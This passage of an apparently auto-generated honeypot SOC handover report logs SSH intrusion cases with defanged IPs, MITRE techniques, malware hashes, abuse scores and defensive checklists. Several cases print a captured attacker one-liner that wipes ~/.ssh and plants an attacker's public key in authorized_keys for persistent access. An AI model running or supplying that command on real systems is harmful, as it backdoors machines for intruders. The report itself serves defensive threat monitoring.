- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0088465f4173

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:09 |
| **Last Seen** | 2026-06-13 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:09:56` | `cowrie.session.connect` |
| `2026-06-13 19:09:56` | `cowrie.client.version` |
| `2026-06-13 19:09:56` | `cowrie.client.kex` |
| `2026-06-13 19:09:57` | `cowrie.login.success` |
| `2026-06-13 19:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe24b65a28fd

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:18 |
| **Last Seen** | 2026-06-13 19:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:18:59` | `cowrie.session.connect` |
| `2026-06-13 19:18:59` | `cowrie.client.version` |
| `2026-06-13 19:19:00` | `cowrie.client.kex` |
| `2026-06-13 19:19:01` | `cowrie.login.success` |
| `2026-06-13 19:19:02` | `cowrie.session.params` |
| `2026-06-13 19:19:02` | `cowrie.command.input` |
| `2026-06-13 19:19:02` | `cowrie.command.failed` |
| `2026-06-13 19:19:02` | `cowrie.log.closed` |
| `2026-06-13 19:19:03` | `cowrie.session.params` |
| `2026-06-13 19:19:03` | `cowrie.command.input` |
| `2026-06-13 19:19:03` | `cowrie.session.file_download` |
| `2026-06-13 19:19:03` | `cowrie.log.closed` |
| `2026-06-13 19:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c540518e67

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:19 |
| **Last Seen** | 2026-06-13 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:19:06` | `cowrie.session.connect` |
| `2026-06-13 19:19:06` | `cowrie.client.version` |
| `2026-06-13 19:19:06` | `cowrie.client.kex` |
| `2026-06-13 19:19:08` | `cowrie.login.success` |
| `2026-06-13 19:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb85ecd2c58

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-13 19:27 |
| **Last Seen** | 2026-06-13 19:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:27:45` | `cowrie.session.connect` |
| `2026-06-13 19:27:45` | `cowrie.client.version` |
| `2026-06-13 19:27:45` | `cowrie.client.kex` |
| `2026-06-13 19:27:46` | `cowrie.login.success` |
| `2026-06-13 19:27:47` | `cowrie.session.params` |
| `2026-06-13 19:27:47` | `cowrie.command.input` |
| `2026-06-13 19:27:47` | `cowrie.command.failed` |
| `2026-06-13 19:27:47` | `cowrie.log.closed` |
| `2026-06-13 19:27:48` | `cowrie.session.params` |
| `2026-06-13 19:27:48` | `cowrie.command.input` |
| `2026-06-13 19:27:48` | `cowrie.session.file_download` |
| `2026-06-13 19:27:48` | `cowrie.log.closed` |
| `2026-06-13 19:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402f08a29c23

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-13 19:27 |
| **Last Seen** | 2026-06-13 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:27:51` | `cowrie.session.connect` |
| `2026-06-13 19:27:51` | `cowrie.client.version` |
| `2026-06-13 19:27:51` | `cowrie.client.kex` |
| `2026-06-13 19:27:52` | `cowrie.login.success` |
| `2026-06-13 19:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1934005c1116

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:28 |
| **Last Seen** | 2026-06-13 19:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:28:01` | `cowrie.session.connect` |
| `2026-06-13 19:28:01` | `cowrie.client.version` |
| `2026-06-13 19:28:02` | `cowrie.client.kex` |
| `2026-06-13 19:28:03` | `cowrie.login.success` |
| `2026-06-13 19:28:04` | `cowrie.session.params` |
| `2026-06-13 19:28:04` | `cowrie.command.input` |
| `2026-06-13 19:28:04` | `cowrie.command.failed` |
| `2026-06-13 19:28:04` | `cowrie.log.closed` |
| `2026-06-13 19:28:04` | `cowrie.session.params` |
| `2026-06-13 19:28:04` | `cowrie.command.input` |
| `2026-06-13 19:28:05` | `cowrie.session.file_download` |
| `2026-06-13 19:28:05` | `cowrie.log.closed` |
| `2026-06-13 19:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1887b8865218

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-06-13 19:28 |
| **Last Seen** | 2026-06-13 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:28:08` | `cowrie.session.connect` |
| `2026-06-13 19:28:08` | `cowrie.client.version` |
| `2026-06-13 19:28:08` | `cowrie.client.kex` |
| `2026-06-13 19:28:09` | `cowrie.login.success` |
| `2026-06-13 19:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `150.5.131[.]119` | **20** | 2026-06-13 18:07 | 2026-06-13 18:46 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `41.63.62[.]103` | **15** | 2026-06-13 18:46 | 2026-06-13 19:30 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `194.124.210[.]127` | **10** | 2026-06-13 17:31 | 2026-06-13 18:30 | 1m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `91.231.89[.]27` | **2** | 2026-06-13 19:05 | 2026-06-13 19:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.176.100[.]32` | 1 | 2026-06-13 17:41 | 2026-06-13 17:41 | 16s | 0 | `T1592` | 🟢 LOW |
| `118.47.3[.]197` | 1 | 2026-06-13 18:26 | 2026-06-13 18:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `123.185.108[.]158` | 1 | 2026-06-13 18:08 | 2026-06-13 18:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]84` | 1 | 2026-06-13 18:15 | 2026-06-13 18:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.191.244[.]158` | 1 | 2026-06-13 18:46 | 2026-06-13 18:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.167.237[.]191` | 1 | 2026-06-13 19:27 | 2026-06-13 19:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.75.109[.]229` | 1 | 2026-06-13 19:35 | 2026-06-13 19:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.161.0[.]235` | 1 | 2026-06-13 18:29 | 2026-06-13 18:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]102` | 1 | 2026-06-13 18:33 | 2026-06-13 18:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]108` | 1 | 2026-06-13 19:08 | 2026-06-13 19:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]108` | 1 | 2026-06-13 18:32 | 2026-06-13 18:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]13` | 1 | 2026-06-13 18:30 | 2026-06-13 18:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]2` | 1 | 2026-06-13 18:30 | 2026-06-13 18:30 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.47.3[.]197` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `123.185.108[.]158` | CN | CHINANET liaoning province network | **100** ⚠️ | 1 |
| `194.124.210[.]127` | FI | Individual Entrepreneur Anton Levin | **100** ⚠️ | 4 |
| `111.176.100[.]32` | CN | CHINANET HUBEI PROVINCE NETWORK | **100** ⚠️ | 0 |
| `91.231.89[.]108` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `91.231.89[.]27` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `94.231.206[.]2` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `94.231.206[.]13` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `160.191.244[.]158` | VN | Hoang Dieu Cloud Computing Company Limited | **100** ⚠️ | 7 |
| `66.132.172[.]102` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 73 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 47 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 84 cases |
| Tool 34  | Credential Extractor        | ✅ 67 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (4.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 20 priority case(s) shown individually · 17 recon entry/entries in table (4 group(s) consolidating 47 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-13T19:42:22Z_
